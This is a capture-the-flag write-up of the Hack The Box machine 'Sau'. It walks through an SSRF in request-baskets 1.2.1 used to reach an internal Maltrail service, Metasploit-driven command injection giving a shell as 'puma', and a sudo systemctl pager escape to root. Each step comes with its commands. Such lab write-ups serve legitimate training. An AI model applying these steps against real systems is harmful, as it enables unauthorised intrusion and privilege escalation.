>[!tldr ] `Sau` is an Easy Difficulty Linux machine that features a `Request Baskets` instance that is vulnerable to Server-Side Request Forgery ( #SSRF ) via `[CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)`. Leveraging the vulnerability we are to gain access to a `Maltrail` instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as `puma`. A `sudo` misconfiguration is then exploited to gain a `root` shell.

# Guided Mode
---
1. `Which is the highest open TCP port on the target machine?`
	1. I checked with a simple `nmap` scan
```
❯ sudo nmap -sT -p- 10.129.229.26 --stats-every=5s
<SNIP>
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```
- Flag #1 -> `55555`

---
2. `What is the name of the open source software that the application on 55555 is "powered by"?`
	1. I ran another `nmap` scan on the port
```
❯ sudo nmap -sCV -p22,80,8338,55555 10.129.229.26 --stats-every=5s
<SNIP>
55555/tcp open     unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 29 Aug 2026 19:49:42 GMT
|     Content-Length: 27
|_    href="/web">Found</a>.
```
- From here i noticed that response code 302 and the href, so I tested if i can open this port through the browser and it worked.
- At the bottom of the browser shows what its ran by
- Flag #2 -> `request-baskets`

---
3. `What is the version of request-baskets running on Sau?`
	1. At the bottom of the browser next to the program is the version
- Flag #3 -> `1.2.1`

---
4. `What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?`
	1. I searched up "request-baskets 1.2.1 vulnerability" and found github repo with the [POC](https://github.com/entr0pie/CVE-2023-27163)
- Flag #4 -> `CVE-2023-27163`

---
5. `What is the name of the software that the application running on port 80 is "powered by"?`
	1. First we generate a new basket through port 55555's "Request Baskets"
		1. `http://10.129.229.26:55555/3qazmwz`
	2. Next, we configure the settings to forward itself
		1. Forward URL: `http://127.0.0.1:80`
		2. Set "Proxy Response"
		3. Set "Expand Forward Path"
	3. Now we use the link we generated and we are brought to a new page.

- Flag #5 -> `Maltrail`

---
6. `There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path on the webserver targeted by this exploit?`
	1. After getting to the webpage using the previous vulnerability, we find the version `mailtrail v0.53` which has the CVE-2025-34073. I then found a `Metasploit` module which i will use (later)
		1. [This article](https://www.sentinelone.com/vulnerability-database/cve-2025-34073/) goes into detail about the CVE
- Flag #6 -> `/login`

---
7. `What system user is the Mailtrack application running as on Sau?`
	1. We will use the previous CVE-2025-34073 through `metasploit`

```shell
msfconsole -q
- Start metasploit
  
msf > use exploit/unix/http/maltrail_rce
- Use the CVE Module
  
msf exploit(unix/http/maltrail_rce) > show options
- We have to fill in the following options
<SNIP>
RHOSTS     10.129.55.146    yes       The target host(s)
RPORT      55555            yes       The target port (TCP)
<SNIP>
TARGETURI  npj5gl5          yes       The URI of the Maltrail server
<SNIP>
LHOST      tun0             yes       The listen address

msf exploit(unix/http/maltrail_rce) > run
- Execute the exploit
  
meterpreter > shell
- Start a shell
  
meterpreter > whoami
puma
```
- Flag #7 -> `puma`

---
- User Flag
	1. From inside the RCE we can use lateral movement to find `user.txt`
- User Flag -> `[REDACTED_FLAG]`

---
9. `What is the full path to the binary (without arguments) the puma user can run as root on Sau?`
	1. Starting with `sudo -l` to see what permissions `puma` has and there is only one binary we can run
- Flag #9 -> `/usr/bin/systemctl`

---
10. `What is the full version string for the instance of systemd installed on Sau`
	1. To get the version we have to use the following command with parameter `--version`
		1. `systemctl --version`
- Flag #10 -> `systemd 245 (245.4-4ubuntu3.22)`

---
11. `What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?`
	1. With a quick google search i found the CVE
- Flag #11 -> `CVE-2023-26604`

---
- Root Flag 
	1. From the previous questions we know about `CVE-2023-26604` which allows privilege escalation. Through the `less` command
	2. This [POC](https://packetstorm.news/files/id/174130) works well, you just have to modify the service to `trail.service`
		1. `sudo /usr/bin/systemctl status trail.service`
		2. Instead of clicking `return` write and run `!/bin/bash`
	3. Then we use lateral movement to get `root.txt`
- Root Flag -> `[REDACTED_FLAG]`